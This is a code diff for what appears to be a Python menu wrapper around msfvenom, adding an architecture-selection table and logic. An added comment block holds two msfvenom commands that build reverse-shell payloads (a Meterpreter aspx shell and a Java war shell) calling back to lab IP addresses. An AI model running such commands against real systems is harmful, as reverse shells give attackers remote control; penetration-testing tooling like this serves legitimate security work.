@@ -27,6 +27,27 @@ platforms_reverse="""
 |============================================================|
 """
 
+architecture_available="""
+|===============================================================
+| (1)  aarch64   | (2)  armbe  | (3)  armle   | (4)  cbea      |
+|===============================================================
+| (5)  cbea64    | (6)  cmd    | (7)  dalvik  | (8)  firefox   |
+|===============================================================
+| (9)  java      | (10) mips   | (11) mips64  | (12) mips64le  |
+|===============================================================
+| (13) mipsbe    | (14) mipsle | (15) nodejs  | (16) php       |
+|===============================================================
+| (17) ppc       | (18) ppc64  | (19) ppc64le | (20) ppce500v2 |
+|===============================================================
+| (21) python    | (22) r      | (23) ruby    | (24) sparc     |
+|===============================================================
+| (25) sparc64   | (26) tty    | (27) x64     | (28) x86       |
+|===============================================================
+| (29) x86_64    | (30) zarch                                  |
+|===============================================================
+"""
+
+
 
 executable_formats = """
 |==================================================================================|
@@ -79,6 +100,18 @@ exp_format =""
 pay_name =""
 command=""
 payload_used=""
+
+'''
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.13 lport=1234 -f aspx -o shell.aspx
+command :  msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=5555 -f war -o shell2.war
+
+met : 
+linux , osx, windows
+
+rev : 
+bsd, linux , osx, windows
+
+'''
 
 def show_banner():
     global shell_type 
@@ -239,6 +272,7 @@ def main():
     show_banner()
     # ---------------------------------------------------
 
+
     # Encoder selection ! --------------------------------
     inp = input("[!] DO YOU WISH TO USE AN ENCODER ? (Y / N (DEFAULT) ) :  ").lower()
     if inp=="y" or inp=="yes":
@@ -254,13 +288,17 @@ def main():
     
     
     # Architecture selection ! ---------------------------
-    inp = input("[*] WHICH ARCHITECTURE DO YOU NEED : ( x86 (DEFAULT) / x64 ) : ").lower()
-    if inp =="x86":
-        arch = "x86"
-    elif inp =="x64":
-        arch = "x64"
+    print("[*] AVAILABLE ARCHITECTURES : ")
+    print(architecture_available)
+    arch_list=["aarch64","armbe","armle","cbea","cbea64","cmd","dalvik","firefox","java","mips","mips64","mips64le","mipsbe","mipsle","nodejs","php","ppc","ppc64","ppc64le","ppce500v2","python","r","ruby","sparc","sparc64","tty","x64","x86","x86_64","zarch"]
+    inp = input("[*] WHICH ARCHITECTURE DO YOU NEED : ( x86 (DEFAULT: Linux/Windows) | dalvik (DEFAULT: Android) ) : ")
+    if inp =="":
+        if platform=='linux' or platform=='windows':
+            arch = "x86"
+        elif platform=='android':
+            arch = "dalvik"
     else:
-        arch = "x86"
+        arch = arch_list[int(inp)-1]
     show_banner()
     # ---------------------------------------------------
 
